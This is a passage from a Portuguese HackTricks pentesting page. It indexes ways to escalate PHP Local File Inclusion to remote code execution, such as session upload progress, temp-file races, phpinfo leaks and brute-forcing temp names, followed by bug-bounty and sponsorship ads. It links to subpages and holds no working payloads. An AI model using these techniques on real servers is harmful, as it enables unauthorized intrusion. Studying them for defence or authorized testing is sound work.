{% endcontent-ref %}

### Através do PHP\_SESSION\_UPLOAD\_PROGRESS

Se você encontrou uma **Inclusão Local de Arquivos**, mesmo que você **não tenha uma sessão** e `session.auto_start` esteja `Off`. Se você fornecer o **`PHP_SESSION_UPLOAD_PROGRESS`** nos dados **multipart POST**, o PHP irá **habilitar a sessão para você**. Você pode abusar disso para obter RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Através do upload de arquivos temporários no Windows

Se você encontrou uma **Inclusão Local de Arquivos** e o servidor está sendo executado no **Windows**, você pode obter RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Através do phpinfo() (file\_uploads = on)

Se você encontrou uma **Inclusão Local de Arquivos** e um arquivo expondo **phpinfo()** com file\_uploads = on, você pode obter RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Através de compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Divulgação de Caminho

Se você encontrou uma **Inclusão Local de Arquivos** e você **pode extrair o caminho** do arquivo temporário, MAS o **servidor** está **verificando** se o **arquivo a ser incluído tem marcas PHP**, você pode tentar **burlar essa verificação** com essa **Condição de Corrida**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Através de espera eterna + força bruta

Se você pode abusar da LFI para **fazer upload de arquivos temporários** e fazer o servidor **ficar pendurado** na execução do PHP, você pode então **forçar nomes de arquivos por horas** para encontrar o arquivo temporário:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Para Erro Fatal

Se você incluir qualquer um dos arquivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Você precisa incluir o mesmo duas vezes para gerar esse erro).

**Eu não sei como isso é útil, mas pode ser.**\
_Mesmo que você cause um Erro Fatal do PHP, os arquivos temporários do PHP enviados são excluídos._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referências

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
